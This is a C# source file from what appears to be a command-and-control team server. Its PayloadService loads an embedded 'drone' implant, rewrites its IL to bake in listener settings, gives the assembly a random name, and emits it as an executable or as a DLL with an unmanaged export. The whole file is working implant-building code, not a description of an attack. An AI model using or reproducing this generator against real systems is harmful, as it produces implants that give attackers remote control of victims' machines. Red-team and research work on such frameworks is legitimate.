using System;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

using dnlib.DotNet;
using dnlib.DotNet.Emit;
using dnlib.DotNet.Writer;
using dnlib.PE;

using TeamServer.Handlers;
using TeamServer.Interfaces;

namespace TeamServer.Services
{
    public class PayloadService : IPayloadService
    {
        private Handler _handler;
        
        public async Task<byte[]> GeneratePayload(Handler handler, string format)
        {
            _handler = handler;
            
            var droneDll = await Utilities.GetEmbeddedResource("drone.dll");
            
            var moduleDef = EmbedHandler(droneDll);
            moduleDef = RandomiseName(moduleDef);
            
            var ms = new MemoryStream();

            if (format.Equals("exe", StringComparison.OrdinalIgnoreCase))
            {
                moduleDef = ConvertDllToExe(moduleDef);
                moduleDef.Write(ms);
            }

            if (format.Equals("dll", StringComparison.OrdinalIgnoreCase))
            {
                moduleDef = AddUnmanagedExport(moduleDef);

                var opts = new ModuleWriterOptions(moduleDef)
                {
                    PEHeadersOptions = {Machine = Machine.AMD64},
                    Cor20HeaderOptions = {Flags = 0}
                };
                
                moduleDef.Write(ms, opts);
            }

            var payload = ms.ToArray();
            await ms.DisposeAsync();
            return payload;
        }

        private ModuleDefMD EmbedHandler(byte[] drone)
        {
            var moduleDef = ModuleDefMD.Load(drone);
            var handlerParameters = _handler.Parameters;
            
            // get handlers (not including the abstract)
            var handlers = moduleDef.Types
                .Where(t => t.FullName.Contains("Drone.Handlers", StringComparison.OrdinalIgnoreCase))
                .Where(t => !t.FullName.Equals("Drone.Handlers.Handler", StringComparison.OrdinalIgnoreCase));
            
            // match the one that matches the abstract name
            // it's actually set in the ctor of all places
            TypeDef targetHandler = null;
            
            foreach (var handler in handlers)
            {
                var ctor = handler.Methods.GetConstructor();
                if (ctor is null) continue;
                
                var instructions = ctor.Body.Instructions.Where(i => i.OpCode == OpCodes.Ldstr);
                
                foreach (var instruction in instructions)
                {
                    if (instruction.Operand is null) continue;
                    var operand = (string) instruction.Operand;
                    if (!operand.Equals(_handler.Name, StringComparison.OrdinalIgnoreCase)) continue;
                    
                    targetHandler = handler;
                    break;
                }
            }

            if (targetHandler is null) throw new Exception("Could not find matching Handler");

            foreach (var handlerParameter in handlerParameters)
            {
                // get matching method in handler
                var method = targetHandler.Methods.GetMethod(handlerParameter.Name);
                var instruction = method?.Body.Instructions.FirstOrDefault(i => i.OpCode == OpCodes.Ldstr);
                if (instruction is null) continue;
                instruction.Operand = handlerParameter.Value;
            }
            
            // finally, ensure that the drone is creating an instance of the correct handler
            var droneType = moduleDef.Types.GetType("Drone");
            var getHandler = droneType.Methods.GetMethod("get_GetHandler");
            getHandler.Body.Instructions[0].Operand = targetHandler.Methods.GetConstructor();

            return moduleDef;
        }

        private static ModuleDefMD ConvertDllToExe(ModuleDefMD mod)
        {
            mod.Kind = ModuleKind.Console;

            var program = mod.Types.GetType("Program");
            var main = program?.Methods.GetMethod("Main");

            mod.EntryPoint = main;

            return mod;
        }

        private static ModuleDefMD AddUnmanagedExport(ModuleDefMD mod)
        {
            var program = mod.Types.GetType("Program");
            var execute = program?.Methods.GetMethod("Execute");
            if (execute is null) return mod;
            
            execute.ExportInfo = new MethodExportInfo();
            execute.IsUnmanagedExport = true;
            
            var type = execute.MethodSig.RetType;
            type = new CModOptSig(mod.CorLibTypes.GetTypeRef("System.Runtime.CompilerServices", "CallConvStdcall"), type);
            execute.MethodSig.RetType = type;

            return mod;
        }

        private static ModuleDefMD RandomiseName(ModuleDefMD mod)
        {
            var name = Path.GetRandomFileName();
            
            mod.Name = name;
            mod.Assembly.Name= name;
            mod.Assembly.Version = new Version(1, 3, 3, 7);
            
            return mod;
        }
    }
}